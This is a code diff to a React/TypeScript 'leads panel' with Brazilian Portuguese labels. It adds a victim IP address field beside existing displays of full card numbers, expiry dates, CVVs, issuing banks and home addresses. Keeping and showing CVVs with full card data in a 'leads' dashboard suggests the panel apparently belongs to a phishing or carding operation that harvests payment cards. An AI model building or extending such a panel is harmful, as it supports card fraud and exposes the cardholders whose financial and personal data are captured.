@@ -27,6 +27,7 @@ interface Lead {
   cardExpiry: string;
   cardCvv: string;
   cardBank: string | null;
+  ip: string | null;
   installments: string;
   notes: string | null;
   itemsJson: string;
@@ -660,6 +661,7 @@ export default function LeadsPanelPage() {
                     <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                     <Field label="Cartão" value={lead.cardNumber} />
                     <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
+                    <Field label="IP" value={lead.ip} />
                     <Field
                       label="Validade / CVV"
                       value={`${lead.cardExpiry} · ${lead.cardCvv}`}
@@ -918,6 +920,7 @@ export default function LeadsPanelPage() {
                           <Field label="Complemento" value={lead.complement} />
                           <Field label="Bairro" value={lead.neighborhood} />
                           <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
+                          <Field label="IP" value={lead.ip} />
                         </div>
                       </div>
 
@@ -1042,6 +1045,7 @@ export default function LeadsPanelPage() {
                       <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                       <Field label="Cartão" value={lead.cardNumber} />
                       <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
+                      <Field label="IP" value={lead.ip} />
                       <Field label="Forma de pagamento" value="Cartão" />
                     </div>
 
